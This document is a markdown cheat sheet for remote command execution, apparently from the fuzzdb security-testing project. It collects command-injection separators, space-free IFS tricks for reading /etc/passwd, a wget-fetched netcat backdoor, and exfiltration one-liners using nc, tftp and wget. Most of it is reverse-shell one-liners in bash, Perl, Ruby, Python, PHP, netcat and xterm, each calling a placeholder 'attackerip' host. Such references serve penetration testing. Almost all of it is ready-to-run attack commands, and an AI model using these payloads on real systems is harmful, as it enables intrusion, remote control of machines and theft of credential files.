Remote Command Exec Cheatsheet

**Executing Commands**

Various ways of separating Commands:<br>
``` blah;blah2 ```

``` blah ^ blah 2```

```blah && blah2```

```FAIL || X```

``` blah%0Dblah2%0Dblah3 ```

``` `blah` ```

``` `blah & blah2` ```

**Shell commands without spaces**

Using Internal Field Separator (IFS):<br>
Test for cmd injection without spaces:<br>
``` sleep${IFS:0:1}20 ```<br>

Example IFS netcat backdoor without spaces:<br>
``` {wget,http://attackerip/nc} ```<br>
``` {chmod,+x,./nc} ```<br>
``` {./nc,-l,-p,1234,-e,/bin/bash} ```<br>

$IFS shell variable:<br>
``` cat$IFS/etc/passwd ```<br>
increment the first +1 to retreive the entire file, line by line<br>
``` cat$IFS/etc/passwd|tail$IFS-n+1|head$IFS-n+1 ```

Shell Variables:<br>
``` CMD=$'cat\x20/etc/passwd';$CMD ```

shell variable, increment through file one line at a time: <br>
increment the first +1 to retreive the entire file, line by line<br>
``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```

**Exfiltrating Files / Data**

FTP <br>
Make a new text file, and echo and then redirect to FTP

NC <br>
``` 'nc -e /bin/sh' ```

NC <br>
``` 'echo /etc/passwd  | nc host port' ```

TFTP <br>
``` 'echo put /etc/passwd | tftp host' ```

WGET: <br>
``` 'wget --post-file /etc/passwd' ```

**One-Liner Reverse Shells**

On the listener <br>
``` $ nc -l -p 1234 -vvv' ```

On the remote host...<br>
<br>
Bash:<br>
``` $ bash -i >& /dev/tcp/attackerip/1234 0>&1 ```

``` $ exec 5<>/dev/tcp/attackerip/1234 ```<br>
``` $ cat <&5 | while read line; do $line 2>&5 >&5; done ```

Perl<br>
```$ perl -e 'use Socket;$i="attackerip";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ```

Perl for Windows target
``` perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ```

Ruby<br>
``` $ ruby -rsocket -e'f=TCPSocket.open("attackerip",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ```

Python<br>
``` $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```

PHP<br>
``` $ php -r '$sock=fsockopen("attackerip",1234);exec("/bin/sh -i <&3 >&3 2>&3");' ```
(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)

Netcat<br>
``` $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip 1234 >/tmp/f ```

Bash<br>
``` bash -i >& /dev/tcp/attackerip/1234 0>&1 ```


**XTERM**<br>
 To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001) with [Xnest](http://www.xfree86.org/4.4.0/Xnest.1.html):<br>
<br>
``` Xnest :1 ```
<br>
Authorize the target IP's connection to you:<br>
<br>
Run this OUTSIDE the Xnest:<br>
``` xterm -display 127.0.0.1:1 ``` 

Run this INSIDE the spawned xterm on the open X Server<br>
``` xhost +targetip ```

Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:<br>
``` xterm -display attackerip:1 ```
<br>or<br>
``` DISPLAY=attackerip:0 xterm ```<br>
It will try to connect back to you, attackerip, on TCP port 6001.<br>

If the xterm path is not within the PATH environment variable, you need to specify its filepath. Solaris path example:<br>
``` /usr/openwin/bin/xterm -display attackerip:1 ```



<br>More docs: [/docs/attack-docs/remote-cmd-exfiltration/](https://github.com/fuzzdb-project/fuzzdb/tree/master/docs/attack-docs/remote-cmd-exfiltration)<br>
